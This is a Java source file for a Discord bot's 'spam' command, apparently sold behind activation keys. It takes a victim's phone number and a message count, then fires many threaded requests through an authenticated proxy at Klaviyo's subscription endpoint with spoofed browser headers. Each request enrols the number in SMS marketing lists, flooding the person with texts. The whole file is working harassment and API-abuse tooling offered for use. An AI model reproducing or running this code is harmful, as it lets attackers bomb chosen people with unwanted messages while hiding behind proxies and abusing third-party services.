package io.github.srinss01.smsspambot.commands;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonSyntaxException;
import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;
import com.mashape.unirest.http.exceptions.UnirestException;
import io.github.srinss01.smsspambot.SMSSpamBotApplication;
import io.github.srinss01.smsspambot.auth.ActivationStatus;
import io.github.srinss01.smsspambot.database.Database;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.interaction.ModalInteractionEvent;
import net.dv8tion.jda.api.interactions.commands.SlashCommandInteraction;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;
import net.dv8tion.jda.api.interactions.modals.ModalMapping;
import net.dv8tion.jda.internal.interactions.CommandDataImpl;
import org.apache.http.HttpHost;
import org.apache.http.auth.AuthSchemeProvider;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.config.AuthSchemes;
import org.apache.http.config.Lookup;
import org.apache.http.config.RegistryBuilder;
import org.apache.http.impl.auth.BasicSchemeFactory;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.ProxyAuthenticationStrategy;

import javax.swing.*;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.Function;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static java.net.HttpURLConnection.HTTP_ACCEPTED;

@SuppressWarnings("unchecked")
public class Spam extends CommandDataImpl implements ICustomCommandData {
    // logger
    private static final org.slf4j.Logger logger = org.slf4j.LoggerFactory.getLogger(Spam.class);
    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
    public static final Function<Database, Spam> COMMAND = Spam::new;
    private static final Map<String, String> headers = new HashMap<>();
    private static final Modal SPAM_MODAL = Modal.create("spam", "Details")
            .addComponents(
                    ActionRow.of(TextInput.create("number", "Phone Number (without the +)", TextInputStyle.SHORT).setMinLength(11).setMaxLength(13).setPlaceholder("XXXXXXXXXXXXX").setRequired(true).build()),
                    ActionRow.of(TextInput.create("message-count", "Message Count", TextInputStyle.SHORT).setMinLength(1).setMaxLength(4).setPlaceholder("Number of messages to send").setRequired(true).build()),
                    ActionRow.of(TextInput.create("thread-count", "Thread Count", TextInputStyle.SHORT).setMinLength(1).setMaxLength(2).setRequired(false).setPlaceholder("defaults to 4").build())
            ).build();

    static {
        headers.put("authority", "a.klaviyo.com");
        headers.put("accept", "*/*");
        headers.put("accept-language", "en-US,en;q=0.9");
        headers.put("access-control-allow-headers", "*");
        headers.put("revision", "2023-02-22");
        headers.put("content-type", "application/json");
        headers.put("sec-fetch-dest", "empty");
        headers.put("sec-fetch-mode", "cors");
        headers.put("sec-fetch-site", "cross-site");
        headers.put("sec-gpc", "1");
        headers.put("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
    }

    public Spam(Database database) {
        super("spam", "Spams SMS to a number");

        String proxyStr = database.getConfig().getProxy();
        Pattern pattern = Pattern.compile("^(?<usr>[\\w-]+):(?<pswrd>[\\w-]+)@(?<host>\\w+(.\\w)*):(?<port>\\d+)$");
        Matcher matcher = pattern.matcher(proxyStr);
        if (!matcher.find()) {
            if (!SMSSpamBotApplication.isHeadless()) {
                JOptionPane.showMessageDialog(null, "Invalid proxy format", "Error", JOptionPane.ERROR_MESSAGE);
            }
            logger.error("Invalid proxy format");
            System.exit(1);
        }
        applyProxy(
            matcher.group("host"),
            matcher.group("port"),
            matcher.group("usr"),
            matcher.group("pswrd")
        );
    }

    public void spamModalInteraction(ModalInteractionEvent event) {
        String number = Objects.requireNonNull(event.getValue("number")).getAsString().trim();
        String messageCount = Objects.requireNonNull(event.getValue("message-count")).getAsString().trim();
        AtomicInteger messageCountInt = new AtomicInteger(Integer.parseInt(messageCount));
        ModalMapping threadCount = event.getValue("thread-count");
        String threadCountString = threadCount == null ? "4" : threadCount.getAsString().trim();
        threadCountString = threadCountString.isBlank() ? "4" : threadCountString;
        if (!number.matches("^\\d{1,3}\\d{10}$")) {
            event.reply("Invalid number").setEphemeral(true).queue();
            return;
        }
        if (!messageCount.matches("^[1-9]\\d{0,3}$")) {
            event.reply("Invalid message count").setEphemeral(true).queue();
            return;
        }
        if (!threadCountString.matches("^[1-9]\\d?$")) {
            event.reply("Invalid thread count").setEphemeral(true).queue();
            return;
        }

        event.reply("Initiating SMS spam...").setEphemeral(true).queue();
        List<String> sites = SMSSpamBotApplication.getSITES();
        TextChannel textChannel = event.getChannel().asTextChannel();
        AtomicInteger threadCountInt = new AtomicInteger(Integer.parseInt(threadCountString) * sites.size());
        ScheduledThreadPoolExecutor executor = new ScheduledThreadPoolExecutor(threadCountInt.get());
        AtomicInteger messageSent = new AtomicInteger(0);
        AtomicInteger messageFailed = new AtomicInteger(0);
        textChannel.sendMessage("Message send - `0`, Message failed - `0`").queue(it -> {
            Runnable edit = () -> it.editMessageFormat("Message sent - `%s`, Message failed - `%s`", messageSent.get(), messageFailed.get()).queue();
            do {
                executor.execute(() -> {
                    while (messageCountInt.getAndDecrement() >= 0) {
                        String site = sites.get((int) (Math.random() * sites.size()));
                        if (site == null) {
                            continue;
                        }
                        try {
                            Map<String, Object> map = GSON.fromJson(site, Map.class);
                            String companyId = map.get("company_id").toString();
                            String siteData = GSON.toJson(map.get("site_data")).replace("{number}", number);



                            HttpResponse<String> response = getHttpResponse(companyId, siteData);

                            if (response.getStatus() == HTTP_ACCEPTED) {
                                messageSent.getAndIncrement();
                                edit.run();
                            } else {
                                String body = response.getBody();
                                if (!body.isBlank()) {
                                    logger.info(body);
                                }
                                messageFailed.getAndIncrement();
                                edit.run();
                            }
                        } catch (JsonSyntaxException | UnirestException e) {
                            logger.error("Error while sending message, {}", e.getMessage());
                        }
                    }
                });
            } while (threadCountInt.getAndDecrement() > 0);
            executor.shutdown();
        });
    }
    public void activationModalInteraction(ModalInteractionEvent event) {
        long userId = event.getUser().getIdLong();
        String key = Objects.requireNonNull(event.getValue("key")).getAsString();
        ActivationStatus.ResponseMap response = validateKey(userId, key);
        if (!response.getBoolean("success")) {
            event.replyFormat("Activation failed: %s", response.getString("message")).setEphemeral(true).queue();
            return;
        }
        event.reply("Successfully activated! please re-run the command to use it").setEphemeral(true).queue();
        Database.activationKeyMap.put(userId, key);
        Database.activationSessionMap.remove(userId);
    }

    private static HttpResponse<String> getHttpResponse(String companyId, String siteData) throws UnirestException {
        return Unirest.post("https://a.klaviyo.com/client/subscriptions/?company_id=" + companyId)
                .headers(headers)
                .body(siteData)
                .asString();
    }

    private static void applyProxy(String host, String port, String usr, String pswrd) {
        HttpClientBuilder clientBuilder = HttpClientBuilder.create();
        CredentialsProvider credsProvider = new BasicCredentialsProvider();
        credsProvider.setCredentials(AuthScope.ANY, new UsernamePasswordCredentials(usr, pswrd));
        clientBuilder.useSystemProperties();
        clientBuilder.setDefaultCredentialsProvider(credsProvider);
        clientBuilder.setProxyAuthenticationStrategy(new ProxyAuthenticationStrategy());
        clientBuilder.setProxy(new HttpHost(host, Integer.parseInt(port)));
        Lookup<AuthSchemeProvider> authProviders = RegistryBuilder.<AuthSchemeProvider>create().register(AuthSchemes.BASIC, new BasicSchemeFactory()).build();
        clientBuilder.setDefaultAuthSchemeRegistry(authProviders);
        Unirest.setHttpClient(clientBuilder.build());
    }

    private static ActivationStatus.ResponseMap validateKey(Long id, String key) {
        try {
            ActivationStatus activationStatus = Database.activationSessionMap.get(id);
            if (activationStatus == null) {
                ActivationStatus.ResponseMap responseMap = new ActivationStatus.ResponseMap();
                responseMap.put("success", false);
                responseMap.put("message", "Encountered an error please re-run the command");
                return responseMap;
            }
            return activationStatus.check(key, String.valueOf(id));
        } catch (UnirestException e) {
            ActivationStatus.ResponseMap responseMap = new ActivationStatus.ResponseMap();
            responseMap.put("success", false);
            responseMap.put("message", "Encountered an error please refer the following message to the developer: ```\n" + e.getMessage() + "\n```");
            return responseMap;
        }
    }

    @Override
    public void execute(SlashCommandInteraction interaction) {
        ActivationStatus.ActivationStatusResponsePair result = ActivationStatus.init();
        ActivationStatus activationSession = result.getActivationStatus();
        if (activationSession == null) {
            interaction.replyFormat("Encountered an error please refer the following message to the developer: ```\n%s\n```", result.getResponseMap().getString("message")).setEphemeral(true).queue();
            return;
        }
        long idLong = interaction.getUser().getIdLong();
        Database.activationSessionMap.put(idLong, activationSession);
        String key = Database.activationKeyMap.get(idLong);
        if (key != null) {
            ActivationStatus.ResponseMap responseMap = validateKey(idLong, key);
            if (responseMap != null && responseMap.getBoolean("success")) {
                interaction.replyModal(SPAM_MODAL).queue();
                return;
            }
        }
        TextInput keyInput = TextInput
                .create("key", "Activation Key", TextInputStyle.SHORT)
                .setPlaceholder("Enter token here")
                .setRequired(true)
                .build();
        interaction.replyModal(Modal.create("activation", "Activate").addActionRow(keyInput).build()).queue();
    }
}